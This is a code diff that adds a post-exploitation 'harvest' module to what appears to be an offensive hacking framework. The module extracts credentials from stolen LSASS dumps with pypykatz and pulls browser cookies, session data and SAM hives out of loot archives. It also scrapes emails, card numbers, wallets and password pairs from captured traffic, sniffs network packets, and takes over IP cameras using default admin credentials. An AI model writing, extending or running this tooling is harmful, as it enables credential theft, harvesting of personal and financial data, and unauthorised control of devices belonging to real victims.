@@ -1,0 +1,101 @@
+"""quantum.postexploit.harvest — data harvester + loot auto-parse."""
+from __future__ import annotations
+
+import os
+import re
+import zipfile
+
+from quantum.core.env import LOOT_DIR, LOG_DIR
+from quantum.core.grayfish import GRAYFISH
+from quantum.core.logging import log
+
+
+class DataHarvester:
+    RX = {
+        "emails":  r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b",
+        "crypto":  r"0x[a-fA-F0-9]{40}|0x[a-fA-F0-9]{64}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{20,60}",
+        "phones":  r"(\+?\d{1,2}[-.\s]?)?\(?\d{3}\)?[-.\s]\d{3}[-.\s]\d{4}",
+        "cards":   r"\b(?:\d[ -]?){13,16}\b",
+        "names":   r"\b(?:[A-Z][a-z]+ ){1,2}[A-Z][a-z]+\b",
+        "userpass": r"Username:\s*\S+[\s\S]{0,40}?Password:\s*\S+",
+    }
+    def analyze_blob(self, txt):
+        return {k: list(set(re.findall(rx, txt)))[:100] for k, rx in self.RX.items()}
+
+    def harvest_host(self, host):
+        out = {}; d = os.path.join(LOOT_DIR, host)
+        if not os.path.isdir(d): return out
+        for fn in os.listdir(d):
+            if fn.endswith(".zip"):
+                try:
+                    with zipfile.ZipFile(os.path.join(d, fn)) as z:
+                        for n in z.namelist():
+                            low = n.lower()
+                            if any(k in low for k in ("cookie", "session", "login data", "credential")):
+                                out.setdefault("browser_creds", []).append(n)
+                            if "sam" in low: out.setdefault("sam", []).append(n)
+                except Exception: pass
+        return out
+
+    def parse_lsass(self, dumpfile):
+        try:
+            import pypykatz.pypykatz as pk
+            m = pk.get_file_secrets(dumpfile, packages=["msv", "wdigest", "tspkg", "kerberos"])
+            return [f"{s['username']}:{s['password']}" for pkg in m.values() for s in pkg["cred"] if s.get("password")]
+        except Exception as e:
+            log(f"lsass parse: {e}", "WARN"); return []
+
+    def analyze_pcap(self, pcap_file):
+        try: data = open(pcap_file, "rb").read()
+        except OSError: data = b""
+        hits = self.analyze_blob(data.decode("latin-1"))
+        try:
+            from scapy.all import rdpcap, IP
+            pkt = rdpcap(pcap_file)
+            hits["dst_hosts"] = list({p[IP].dst for p in pkt if IP in p})[:200]
+        except Exception: pass
+        return hits
+
+    def sniff(self, iface=None, count=500, out=None):
+        out = out or os.path.join(LOG_DIR, "capture.pcap")
+        try:
+            from scapy.all import wrpcap, sniff
+            wrpcap(out, sniff(iface=iface, count=count))
+            log(f"captured {count} pkts -> {out}", "OK"); return out
+        except Exception as e:
+            log(f"sniff failed: {e}", "WARN"); return None
+
+    def discover_cameras(self, cidr=None):
+        from quantum.camwar.engine import CAMWAR
+        from quantum.core.env import local_scope
+        return CAMWAR.discover(cidr or local_scope())
+
+    def control_camera(self, ip, user="admin", pwd="admin"):
+        from quantum.camwar.engine import CAMWAR
+        cam = {"ip": ip, "vendor": CAMWAR.identify(ip).get("vendor")}
+        return CAMWAR.one_shot(ip)
+
+
+def auto_parse_loot(host, zipfn):
+    try:
+        import pypykatz.pypykatz as pk
+        if zipfile.is_zipfile(zipfn):
+            with zipfile.ZipFile(zipfn) as z:
+                for n in z.namelist():
+                    if n.endswith(".dmp"):
+                        tmp = os.path.join(LOG_DIR, f"_{host}_{n}")
+                        open(tmp, "wb").write(z.read(n))
+                        try:
+                            m = pk.get_file_secrets(tmp, packages=["msv", "wdigest", "tspkg", "kerberos"])
+                            creds = [f"{s['username']}:{s['password']}"
+                                     for pkg in m.values() for s in pkg["cred"] if s.get("password")]
+                            out = os.path.join(LOOT_DIR, host, "parsed.txt")
+                            os.makedirs(os.path.dirname(out), exist_ok=True)
+                            open(out, "a").write("\n".join(creds) + "\n")
+                            log(f"auto-parse: {len(creds)} creds from {host}/{n}", "OK")
+                            GRAYFISH.seal(out)
+                        finally: os.unlink(tmp)
+    except ImportError:
+        log("pypykatz missing — auto-parse disabled", "INFO")
+    except Exception as e:
+        log(f"auto-parse: {e}", "WARN")
